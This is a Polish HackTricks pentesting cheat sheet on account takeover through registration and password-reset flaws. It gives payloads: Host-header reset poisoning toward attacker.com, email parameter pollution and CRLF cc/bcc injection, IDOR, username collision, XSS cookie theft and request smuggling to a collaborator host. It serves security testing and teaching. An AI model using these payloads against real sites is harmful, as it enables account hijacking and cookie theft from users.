# Luki i podatności na przejęcie rejestracji

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) to wyszukiwarka zasilana przez **dark web**, która oferuje **darmowe** funkcje sprawdzania, czy firma lub jej klienci nie zostali **skompromitowani** przez **złośliwe oprogramowanie kradnące informacje**.

Ich głównym celem WhiteIntel jest zwalczanie przejęć kont i ataków ransomware wynikających z złośliwego oprogramowania kradnącego informacje.

Możesz sprawdzić ich stronę internetową i wypróbować ich silnik za **darmo** pod adresem:

{% embed url="https://whiteintel.io" %}

***

## Przejęcie rejestracji

### Duplikacja rejestracji

* Spróbuj wygenerować używając istniejącej nazwy użytkownika
* Sprawdź zmieniając adres e-mail:
* wielkie litery
* \+1@
* dodaj kropkę w adresie e-mail
* znaki specjalne w nazwie e-maila (%00, %09, %20)
* Dodaj czarne znaki po adresie e-mail: `test@test.com a`
* victim@gmail.com@attacker.com
* victim@attacker.com@gmail.com

### Wyliczanie nazwy użytkownika

Sprawdź, czy możesz ustalić, kiedy nazwa użytkownika została już zarejestrowana w aplikacji.

### Polityka hasła

Tworząc użytkownika, sprawdź politykę hasła (sprawdź, czy można używać słabych haseł).\
W takim przypadku możesz spróbować przeprowadzić atak bruteforce na dane uwierzytelniające.

### Wstrzyknięcie SQL

[**Sprawdź tę stronę** ](sql-injection/#insert-statement), aby dowiedzieć się, jak próbować przejmować konta lub wydobywać informacje za pomocą **Wstrzyknięć SQL** w formularzach rejestracyjnych.

### Przejęcia Oauth

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### Podatności SAML

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### Zmiana adresu e-mail

Po zarejestrowaniu spróbuj zmienić adres e-mail i sprawdź, czy ta zmiana jest poprawnie zweryfikowana lub czy można zmienić ją na dowolne adresy e-mail.

### Dodatkowe sprawdzenia

* Sprawdź, czy można używać **adresów e-mail jednorazowego użytku**
* **Długie** **hasło** (>200) prowadzi do **DoS**
* **Sprawdź limity szybkości tworzenia kont**
* Użyj username@**burp\_collab**.net i przeanalizuj **wywołanie zwrotne**

## **Przejęcie resetowania hasła**

### Wyciek tokena resetowania hasła za pośrednictwem referenta <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Poproś o zresetowanie hasła na swój adres e-mail
2. Kliknij w link resetowania hasła
3. Nie zmieniaj hasła
4. Kliknij na dowolne strony zewnętrzne (np. Facebook, Twitter)
5. Przechwyć żądanie w proxy Burp Suite
6. Sprawdź, czy nagłówek referer wycieka token resetowania hasła.

### Zatrucie resetowania hasła <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Przechwyć żądanie resetowania hasła w Burp Suite
2. Dodaj lub edytuj następujące nagłówki w Burp Suite: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Przekaż żądanie z zmodyfikowanym nagłówkiem\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Szukaj adresu URL resetowania hasła na podstawie _nagłówka hosta_ jak : `https://attacker.com/reset-password.php?token=TOKEN`

### Resetowanie hasła za pomocą parametru e-mail <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR na parametrach API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Atakujący musi zalogować się na swoje konto i przejść do funkcji **Zmień hasło**.
2. Uruchom Burp Suite i przechwyć żądanie.
3. Wyślij je do karty repeater i edytuj parametry: ID użytkownika/email\
`powershell POST /api/changepass [...] ("form": {"email":"ofiara@email.com","password":"bezpiecznehaslo"})`

### Słaby token resetowania hasła <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Token resetowania hasła powinien być generowany losowo i unikalny za każdym razem.\
Spróbuj określić, czy token wygasa, czy zawsze jest taki sam, w niektórych przypadkach algorytm generowania jest słaby i może być odgadnięty. Następujące zmienne mogą być używane przez algorytm.

* Znacznik czasu
* ID użytkownika
* Email użytkownika
* Imię i nazwisko
* Data urodzenia
* Kryptografia
* Tylko liczby
* Krótka sekwencja tokena (znaki między \[A-Z,a-z,0-9])
* Ponowne użycie tokenu
* Data wygaśnięcia tokenu

### Wyciekający token resetowania hasła <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Wywołaj żądanie resetowania hasła za pomocą interfejsu API/UI dla określonego adresu e-mail, np. test@mail.com
2. Sprawdź odpowiedź serwera i sprawdź `resetToken`
3. Następnie użyj tokenu w adresie URL, np. `https://przykład.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Resetowanie hasła poprzez kolizję nazwy użytkownika <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Zarejestruj się w systemie z nazwą użytkownika identyczną z nazwą użytkownika ofiary, ale z białymi znakami wstawionymi przed i/lub po nazwie użytkownika, np. `"admin "`
2. Poproś o zresetowanie hasła za pomocą swojej złośliwej nazwy użytkownika.
3. Użyj otrzymanego tokenu w e-mailu i zresetuj hasło ofiary.
4. Zaloguj się na konto ofiary za pomocą nowego hasła.

Platforma CTFd była podatna na ten atak.\
Zobacz: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Przejęcie konta poprzez atak typu Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Znajdź XSS wewnątrz aplikacji lub subdomenie, jeśli ciasteczka są ograniczone do domeny nadrzędnej: `*.domena.com`
2. Wyciekaj bieżące **ciasteczka sesji**
3. Uwierzytelnij się jako użytkownik, korzystając z ciasteczka

### Przejęcie konta poprzez HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. Użyj **smuggler** do wykrycia typu HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. Stwórz żądanie, które nadpisze `POST / HTTP/1.1` następującymi danymi:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` z celem przekierowania ofiar do burpcollab i kradzieży ich ciasteczek\
3\. Ostateczne żądanie może wyglądać następująco
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
### Przejęcie Konta za pomocą CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Stwórz ładunek dla CSRF, np. "Formularz HTML z automatycznym przesłaniem zmiany hasła"
2. Wyślij ładunek

### Przejęcie Konta za pomocą JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

Token JSON Web może być używany do uwierzytelniania użytkownika.

* Edytuj JWT z innym identyfikatorem użytkownika / adresem e-mail
* Sprawdź słabą sygnaturę JWT

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## Odnośniki

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) to wyszukiwarka zasilana przez **dark web**, która oferuje **darmowe** funkcje do sprawdzania, czy firma lub jej klienci nie zostali **skompromitowani** przez **złośliwe oprogramowanie kradnące informacje**.

Ich głównym celem WhiteIntel jest zwalczanie przejęć kont i ataków ransomware wynikających z złośliwego oprogramowania kradnącego informacje.

Możesz odwiedzić ich stronę internetową i wypróbować ich silnik **za darmo** pod adresem:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
